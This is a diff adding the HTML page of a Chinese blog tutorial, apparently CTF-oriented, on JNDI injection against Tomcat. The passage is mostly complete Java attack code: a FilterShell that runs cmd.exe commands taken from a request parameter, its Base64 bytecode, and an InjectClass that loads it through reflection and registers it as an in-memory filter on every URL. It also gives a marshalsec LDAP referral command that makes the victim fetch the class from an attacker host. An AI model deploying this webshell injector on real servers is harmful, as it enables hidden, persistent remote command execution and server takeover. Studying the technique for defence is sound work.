@@ -1,0 +1,278 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>JNDI注入 | 楽のsecret base</title><meta name="author" content="楽依"><meta name="copyright" content="楽依"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="放假放假放假">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JNDI注入">
+<meta property="og:url" content="https://leyi.live/2026/01/18/JNDI%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="楽のsecret base">
+<meta property="og:description" content="放假放假放假">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://leyi.live/img/post22.jpg">
+<meta property="article:published_time" content="2026-01-18T07:38:32.000Z">
+<meta property="article:modified_time" content="2026-01-18T07:45:30.969Z">
+<meta property="article:author" content="楽依">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://leyi.live/img/post22.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "JNDI注入",
+  "url": "https://leyi.live/2026/01/18/JNDI%E6%B3%A8%E5%85%A5/",
+  "image": "https://leyi.live/img/post22.jpg",
+  "datePublished": "2026-01-18T07:38:32.000Z",
+  "dateModified": "2026-01-18T07:45:30.969Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "楽依",
+      "url": "https://leyi.live"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="https://leyi.live/2026/01/18/JNDI%E6%B3%A8%E5%85%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'JNDI注入',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style>
+  #custom-loading {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #0B0B0B;
+    z-index: 9999;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    transition: opacity 0.5s ease;
+  }
+  .loading-content {
+    position: relative;
+    width: 100%;
+    height: 100%;
+  }
+  .loading-content span {
+    width: 8vmin;
+    height: 8vmin;
+    border-radius: 4vmin;
+    backface-visibility: hidden;
+    position: absolute;
+    animation-name: loadingMove;
+    animation-timing-function: cubic-bezier(0.4, 0, 1, 0.8);
+    animation-iteration-count: infinite;
+    animation-duration: 3s;
+    top: 50%;
+    left: 50%;
+    transform-origin: -4vmin center;
+  }
+  .loading-content span:nth-child(1) { background: #E5E6E5; animation-delay: -0.5s; opacity: 0; }
+  .loading-content span:nth-child(2) { background: #494A49; animation-delay: -1s; opacity: 0; }
+  .loading-content span:nth-child(3) { background: #8F908F; animation-delay: -1.5s; opacity: 0; }
+  .loading-content span:nth-child(4) { background: #E5E6E5; animation-delay: -2s; opacity: 0; }
+  .loading-content span:nth-child(5) { background: #494A49; animation-delay: -2.5s; opacity: 0; }
+  .loading-content span:nth-child(6) { background: #8F908F; animation-delay: -3s; opacity: 0; }
+  @keyframes loadingMove {
+    0% { transform: scale(1) rotate(0deg) translate3d(0, 0, 1px); }
+    30% { opacity: 1; }
+    100% { z-index: 10; transform: scale(0) rotate(360deg) translate3d(0, 0, 1px); }
+  }
+</style>
+<script>
+  // 立即写入加载动画，不等待任何事件
+  document.write(`
+    <div id="custom-loading">
+      <div class="loading-content">
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+    </div>
+  `);
+</script>
+<meta name="generator" content="Hexo 8.1.1"></head><body><div id="web_bg" style="background-image: url(/img/background.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><span> 链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/post22.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/bar0.gif" alt="Logo"><span class="site-name">楽のsecret base</span></a><a class="nav-page-title" href="/"><span class="site-name">JNDI注入</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><span> 链接</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">JNDI注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-01-18T07:38:32.000Z" title="Created 2026-01-18 15:38:32">2026-01-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-01-18T07:45:30.969Z" title="Updated 2026-01-18 15:45:30">2026-01-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9B%B8%E5%85%B3/">CTF相关</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>通过JNDI可以使服务器远程下载类文件动态加载对象，如果该类文件是一个恶意的类对象，则可以达到无文件注入内存马的目的</p>
+<br/>
+
+<h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p>JNDI（Java Naming and Directory Interface）Java 命名与目录接口，是 Java 平台的一个 API。JNDI 允许将资源（如数据库连接、Java 对象）存储在命名服务中。为了存储自定义对象，JNDI 引入了 <code>Reference</code> 类，当客户端调用 <code>lookup()</code> 查询一个 Reference 对象时，如果本地 classpath 找不到该类，Java 就会根据 <code>ClassFactoryLocation</code> 指定的 URL 去远程下载这个 <code>.class</code> 文件。攻击者通过控制 JNDI 查询的地址，诱导服务器从远程恶意服务器加载并实例化一个恶意 Java 类，从而实现远程代码执行（RCE）</p>
+<br/>
+
+<h2 id="JNDI注入内存马"><a href="#JNDI注入内存马" class="headerlink" title="JNDI注入内存马"></a>JNDI注入内存马</h2><p>接下来尝试使用JNDI注入Filter内存马</p>
+<p>首先需要一个受害端，该端需要能够调用<code>lookup()</code>方法去加载ldap协议地址，我简单改了Tomcat默认的初始页面，使其能够接收一个<code>name</code>参数并查询</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        message = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (name != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">                context.lookup(name);</span><br><span class="line">                response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于JNDI一次只能加载并实例化一次类对象，在这个对象中，我们需要获取<code>StandardContext</code>，并将恶意Filter注册进去，所以在无参构造方法中，我们还需要将恶意Filter动态加载出来</p>
+<p>构建恶意Filter类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterShell</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            ProcessBuilder processBuilder;</span><br><span class="line">            processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            res.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">            res.getWriter().println(output);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            chain.doFilter(req, res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将其该类导出为Base64字符串，便于在无参构造方法中还原并加载</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dump</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, IOException, CannotCompileException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;FilterShell&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = cc.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(encode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于JNDI注入时拿不到<code>Request</code>、<code>Response</code>对象，我们需要另一个方法获取<code>StandarContext</code>，对于Tomcat8.0版本，可以使用以下获取</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="type">StandardRoot</span> <span class="variable">standardRoot</span> <span class="operator">=</span> (StandardRoot) webappClassLoaderBase.getResources();</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardRoot.getContext();</span><br></pre></td></tr></table></figure>
+
+<p>受害端加载的类对象如下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectClass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InjectClass</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">StandardRoot</span> <span class="variable">standardRoot</span> <span class="operator">=</span> (StandardRoot) webappClassLoaderBase.getResources();</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardRoot.getContext();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">sourceCode</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADQAiwoAHQBPCABACwBQAFEHAFIKAAQATwcAUwcAVAgAVQgAVgoABgBXCgAGAFgHAFkHAFoKAFsAXAoADQBdCgAMAF4KAAwAXwoABABgCABhBwBiBwBjCgAVAGQIAGULAGYAZwsAZgBoCgBpAGoLAGsAbAcAbQcAbgcAbwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQANTEZpbHRlclNoZWxsOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHAHABAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAdwcm9jZXNzAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEABnJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBABJMamF2YS9sYW5nL1N0cmluZzsBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQAGb3V0cHV0AQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEADnByb2Nlc3NCdWlsZGVyAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAANyZXEBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAANyZXMBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQAFY2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsBAANjbWQBAA1TdGFja01hcFRhYmxlBwBtBwBxBwByBwBzBwBUBwBSBwBTBwB0BwBZBwBiAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABBGaWx0ZXJTaGVsbC5qYXZhDAAfACAHAHEMAHUAdgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAHwB3DAB4AHkBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcAdAwAegB7DAAfAHwMAB8AfQwAfgB/DACAAIEBAAEKAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAfAIIBABd0ZXh0L2h0bWw7Y2hhcnNldD1VVEYtOAcAcgwAgwCEDACFAIYHAIcMAIgAiQcAcwwALACKAQALRmlsdGVyU2hlbGwBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQARamF2YS9sYW5nL1Byb2Nlc3MBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgEADnNldENvbnRlbnRUeXBlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYAIQAcAB0AAQAeAAAABAABAB8AIAABACEAAAAvAAEAAQAAAAUqtwABsQAAAAIAIgAAAAYAAQAAAAYAIwAAAAwAAQAAAAUAJAAlAAAAAQAmACcAAgAhAAAANQAAAAIAAAABsQAAAAIAIgAAAAYAAQAAAAsAIwAAABYAAgAAAAEAJAAlAAAAAAABACgAKQABACoAAAAEAAEAKwABACwALQACACEAAAGhAAYACgAAAJkrEgK5AAMCADoEGQTGAIS7AARZtwAFOgW7AAZZBr0AB1kDEghTWQQSCVNZBRkEU7cACjoGGQa2AAs6B7sADFm7AA1ZGQe2AA63AA+3ABA6CBkItgARWToJxgATGQUZCbYAEhITtgASV6f/6KcADzoHuwAVWRkHtwAWvywSF7kAGAIALLkAGQEAGQW2ABqnAAstKyy5ABsDALEAAQA0AGsAbgAUAAMAIgAAAEIAEAAAAA8ACgAQAA8AEQAYABMANAAVADsAFgBQABgAWwAZAGsAHQBuABsAcAAcAHoAHgCCAB8AjQAgAJAAIQCYACMAIwAAAHAACwA7ADAALgAvAAcAUAAbADAAMQAIAFgAEwAyADMACQBwAAoANAA1AAcAGAB1ADYANwAFADQAWQA4ADkABgAAAJkAJAAlAAAAAACZADoAOwABAAAAmQA8AD0AAgAAAJkAPgA/AAMACgCPAEAAMwAEAEEAAAAwAAb/AFAACQcAQgcAQwcARAcARQcARgcARwcASAcASQcASgAA+QAaQgcASwv5ABUHACoAAAAGAAIAFAArAAEATAAgAAEAIQAAACsAAAABAAAAAbEAAAACACIAAAAGAAEAAAAnACMAAAAMAAEAAAABACQAJQAAAAEATQAAAAIATg==&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(sourceCode);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = (Class&lt;?&gt;) method.invoke(classLoader, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filterShell</span> <span class="operator">=</span> (Filter) clazz.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilterName(<span class="string">&quot;FilterShell&quot;</span>);</span><br><span class="line">        filterDef.setFilter(filterShell);</span><br><span class="line">        filterDef.setFilterClass(filterShell.getClass().getName());</span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt; constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.setFilterName(<span class="string">&quot;FilterShell&quot;</span>);</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        standardContext.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">        filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Map&lt;String, ApplicationFilterConfig&gt; filterConfigs = (Map&lt;String, ApplicationFilterConfig&gt;) filterConfigsField.get(standardContext);</span><br><span class="line">        filterConfigs.put(<span class="string">&quot;FilterShell&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将<code>InjectClass</code>编译为class文件，并托管在服务器上，我们需要在攻击者的服务器上搭建一个ldap服务，可以使用<code>marshalsec.jar</code>进行，在攻击者服务器执行以下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -Djava.net.preferIPv4Stack=<span class="literal">true</span> -<span class="built_in">cp</span> marshalsec.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://XXX.XXX.XXX.XXX/#InjectClass&quot;</span> 8080</span><br></pre></td></tr></table></figure>
+
+<p>还需要使用Python搭建一个http服务，用于提供class文件的下载服务</p>
